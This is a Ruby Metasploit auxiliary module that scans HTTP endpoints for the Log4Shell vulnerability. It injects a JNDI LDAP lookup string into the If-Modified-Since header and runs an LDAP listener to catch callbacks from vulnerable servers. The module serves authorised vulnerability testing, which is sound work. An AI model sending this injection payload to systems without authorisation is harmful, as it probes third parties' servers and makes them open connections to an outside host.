##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Log4Shell Scanner',
      'Description' => 'Check and HTTP endpoint for the Log4Shell vulnerability.',
      'Author' => [
        'Spencer McIntyre'
      ],
      'License' => MSF_LICENSE
    )

    register_options([
      OptString.new('TARGETURI', [ true, 'The URI to scan', '/'])
    ])
  end

  def jndi_string(resource)
    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}}"
  end

  def on_client_connect(client)
    print_good('Received client connection!')
    client.extend(Net::BER::BERParser)
    Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))

    client.write(['300c02010161070a010004000400'].pack('H*'))
    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
    token = pdu.search_parameters[:base_object].to_s

    if @tokens[token]
      print_good('Vulnerability found!')
    end
  end

  def rand_text_alpha_lower_numeric(len, bad = '')
    foo = []
    foo += ('a'..'z').to_a
    foo += ('0'..'9').to_a
    Rex::Text.rand_base(len, bad, *foo)
  end

  def run
    @tokens = {}
    start_service
    super
  ensure
    stop_service
  end

  def replicant
    obj = super
    obj.tokens = tokens
    obj
  end

  # Fingerprint a single host
  def run_host(_ip)
    token = rand_text_alpha_lower_numeric(8..32)
    @tokens[token] = {
      rhost: rhost,
      target_uri: target_uri,
      method: 'GET'
    }
    send_request_raw({ 'uri' => normalize_uri(target_uri), 'method' => 'GET', 'headers' => { 'If-Modified-Since' => jndi_string(token) } }, 3)
  end

  attr_accessor :tokens
end
